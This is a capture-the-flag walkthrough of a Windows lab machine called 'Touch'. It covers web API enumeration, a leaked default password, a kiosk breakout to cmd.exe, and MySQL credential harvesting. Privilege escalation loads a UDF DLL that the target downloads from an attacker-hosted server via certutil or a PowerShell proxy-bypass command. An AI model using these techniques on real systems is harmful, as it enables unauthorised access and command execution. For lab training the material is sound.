# Touch

## Find Open Ports and Services Running on the Target IP

Command:

```bash
nmap -sC -sV -Pn -p- 10.129.164.166 -oA nmap_output
```

The scan identifies the target as **Windows** and reveals three open ports:

```text
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-cors: GET POST PUT OPTIONS
Service Info: OS: Windows
```

Observations:

- `135/tcp` — MSRPC, nothing actionable without creds.
- `3389/tcp` — RDP. On a Windows box this is a *post-exploitation* door; it needs credentials, so it's parked for later.
- `8443/tcp` — a self-hosted HTTP service (`Microsoft-HTTPAPI/2.0`, not IIS) serving a **Nexion DeviceHub** login. The `http-cors: GET POST PUT OPTIONS` header and the `/login` redirect point to a REST API behind a single-page app.

With two of the three ports requiring credentials, the entire initial attack surface is the web service on `8443`.

---

## Investigate the Web Service

Open `https://10.129.164.166:8443/` in a browser (accept the self-signed cert). It presents a **login page**. Inspect the page source — it carries a hint:

```text
<!-- default password is the device serial number -->
```

So the login scheme is simple: **the default password is the device serial number.** The task becomes finding where that serial number is exposed.

---

## Enumerate Directories and the API

Directory-enumerate the application with `ffuf` (the `-k` flag skips the self-signed cert):

```bash
ffuf -k -u https://10.129.164.166:8443/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

This discovers an `/api` endpoint. Requesting it directly returns nothing useful, so instead of stopping there, continue the enumeration **recursively** using `/api` as the new root:

```bash
ffuf -k -u https://10.129.164.166:8443/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Two additional endpoints appear:

```text
/api/scan
/api/status
```

Access them to look for the serial number referenced on the login page:

```bash
curl -sk https://10.129.164.166:8443/api/status
curl -sk https://10.129.164.166:8443/api/scan
```

One of these responses discloses the **device serial number** — exactly the value the login page said to use as the default password.

---

## Log In and Pivot to RDP

Use the leaked serial number as the password on the Nexion DeviceHub login. It authenticates and redirects to the **dashboard**.

The dashboard exposes the credentials for the **`KioskUser`** Windows account. With RDP (3389) already open, use those credentials directly against it:

```bash
xfreerdp /v:10.129.164.166 /u:KioskUser /p:'K!0sk2026#' /cert:ignore +clipboard /dynamic-resolution
```

> Single-quote the password so bash doesn't try to history-expand the `!` or treat `#` as a comment. On newer Kali the binary is `xfreerdp3` with identical flags.

It works — but RDP drops you into a **locked-down kiosk**, not a desktop: the full-screen "HTB Airways" self-checkout (Gate B7, Terminal 4, Kiosk #042). No Start menu, no taskbar, no shell. The next step is escaping it.

---

## Break Out of the Kiosk

The kiosk is a scan workflow, and the escape is a classic **kiosk browser breakout** through the file-open dialog.

1. From the kiosk, choose the **Staff Login** option.
2. Trigger a **scan**. It fails and the app raises an **error** page, rendered in the kiosk's embedded browser (a locally hosted page on the Windows machine).
3. With that browser control in focus, press **Ctrl+O**. The Windows **file-open dialog** opens.
4. In the filename box, type `cmd.exe` and press Enter.

The dialog launches `cmd.exe`, and you drop into a command prompt as `KioskUser`:

```cmd
whoami
```

Why this works: the file-open dialog is a full shell surface — anything you can name, it executes. A textbook kiosk escape that bypasses the application's missing shell.

---

## Retrieve User Flag

```cmd
type C:\Users\KioskUser\Desktop\user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Find the Database Service and Application Credentials

From the `KioskUser` shell, enumerate listening ports:

```cmd
netstat -ano | findstr :3306
```

MySQL is listening on `127.0.0.1:3306`. Search the kiosk's backend for its database configuration:

```cmd
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
```

The config exposes the application database account:

```text
kiosk_app : K!0sk_R3pl1ca#DB
```

Connect with it:

```cmd
mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306
```

---

## Enumerate the Database

Explore what the `kiosk_app` account can see:

```sql
SHOW DATABASES;
USE htb_staff;
SHOW TABLES;
DESCRIBE htb_staff;
```

Dump the staff records:

```sql
SELECT employee_id, email, auth_code, role, active FROM htb_staff;
```

This yields the employee table with roles and auth codes — useful context, and the kind of data worth noting for credential reuse. Continuing to explore the filesystem turns up the prize: a scheduled-task helper script at `C:\ProgramData\HTB Airways\refresh-dates.bat` holds the **hardcoded MySQL `root` credentials**:

```cmd
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

Reconnect as root with the password it reveals:

```cmd
mysql.exe -u root -pHTB@irw4ys_DB!2026 -h 127.0.0.1 -P 3306
```

```sql
SELECT current_user();
-- root@localhost
```

---

## Inspect root's File Privilege

Check the `root` account's file privilege in `mysql.user`:

```sql
SELECT user, host, File_priv FROM mysql.user WHERE user = 'root';
```

```text
+------+-----------+-----------+
| user | host      | File_priv |
+------+-----------+-----------+
| root | localhost | Y         |
+------+-----------+-----------+
```

`File_priv = Y`. But before reaching for `LOAD_FILE`, check `secure_file_priv` and the plugin directory:

```sql
SELECT @@secure_file_priv, @@plugin_dir;
```

```text
+--------------------+----------------------+
| @@secure_file_priv | @@plugin_dir         |
+--------------------+----------------------+
| NULL               | C:\MySQL\lib\plugin\ |
+--------------------+----------------------+
```

**This is the key detail.** `secure_file_priv = NULL` disables *all* SQL file I/O — `LOAD_FILE`, `INTO OUTFILE`, and `INTO DUMPFILE` all fail. So you cannot read `root.txt` with `LOAD_FILE`, and you cannot write the UDF DLL to disk via `INTO DUMPFILE`.

However, `secure_file_priv` does **not** govern `CREATE FUNCTION ... SONAME` — that statement loads a shared library from `plugin_dir` through the plugin loader, outside the file-I/O layer. So as long as a DLL can be placed in `plugin_dir` by other means, UDF execution remains fully available.

Confirm write access to the plugin directory:

```cmd
icacls C:\MySQL\lib\plugin
```

An `(M)` (Modify) or `(F)` (Full Control) ACE for the current user is the green light.

---

## What is a UDF?

**UDF** stands for *User-Defined Function* — a way to extend MySQL with custom functions implemented as shared libraries (`.so` on Linux, `.dll` on Windows). A well-known offensive library, `lib_mysqludf_sys`, exposes `sys_exec`/`sys_eval`, which run OS commands through MySQL. Because the function executes in the context of the **MySQL service account**, loading it as root yields command execution as that account — on this box, a high-privilege one.

The compiled DLL ships with Metasploit:

```text
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
```

---

## Deliver the DLL to plugin_dir

Host the DLL on the attacker box:

```bash
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll ~/
cd ~ && sudo python3 -m http.server 80
```

`certutil.exe` is a built-in LOLBIN for downloading files:

```cmd
cd C:\MySQL\lib\plugin
certutil.exe -urlcache -split http://10.10.15.176/lib_mysqludf_sys_64.dll .
```

> **Gotcha from this box:** `certutil` honors Windows' WinINET proxy configuration and here returns `**** OFFLINE ****` even though ICMP to the attacker succeeds. **certutil `OFFLINE` + a working ping = a proxy problem** (ping uses ICMP and bypasses the proxy; certutil doesn't). The reliable fix is a PowerShell download with the proxy explicitly nulled:
>
> ```cmd
> powershell -c "$w=New-Object Net.WebClient; $w.Proxy=$null; $w.DownloadFile('http://10.10.15.176/lib_mysqludf_sys_64.dll','C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll')"
> ```

Confirm the DLL landed (it should be **7168 bytes**):

```cmd
dir C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

---

## Create the UDF and Get Command Execution

Back in the `mysql>` prompt (as root), register the function and run a command:

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
SELECT sys_eval('whoami');
```

`sys_eval` executes as the MySQL service account. The output is returned as a **hex blob** (the client renders the `STRING` return as binary) — decode it with CyberChef (*From Hex*) or locally:

```bash
python3 -c "print(bytes.fromhex('<hex>').decode())"
```

---

## Read the Root Flag

```sql
SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');
```

> Note the **doubled backslashes** — inside a MySQL string literal `\` is the escape character, so `\r`, `\U`, etc. corrupt the path. Use `\\` or forward slashes.

The flag comes back as hex; decode it in CyberChef (*From Hex*) for the 32-character root flag.

**Cleaner alternative — skip hex entirely.** Have `sys_eval` copy the flag to a readable location, then `type` it as plain text in your `cmd` window:

```sql
SELECT sys_eval('cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\MySQL\\lib\\plugin\\r.txt');
```

```cmd
type C:\MySQL\lib\plugin\r.txt
```

That prints the root flag directly — no transcription, no decoding. The box is rooted.

---

# Attack Chain

```text
Nexion DeviceHub recon (8443)
   → login source hint: "default password is the device serial number"
   → ffuf → /api → recursive ffuf → /api/scan, /api/status leak the serial number
   → authenticate → dashboard exposes KioskUser credentials
   → RDP (3389) as KioskUser → locked-down HTB Airways kiosk
   → kiosk breakout: Staff Login → scan → error page
                     → Ctrl+O → cmd.exe → shell as KioskUser
   → User Flag
   → netstat: MySQL 3306 → kiosk_app creds in backend index.ts
   → enumerate htb_staff DB → root creds in C:\ProgramData\HTB Airways\refresh-dates.bat
   → MySQL root: File_priv=Y but secure_file_priv=NULL (LOAD_FILE/OUTFILE dead)
   → UDF still viable: DLL into plugin_dir (PowerShell, proxy bypassed)
                     → CREATE FUNCTION sys_eval → exec as service account
   → Root Flag
```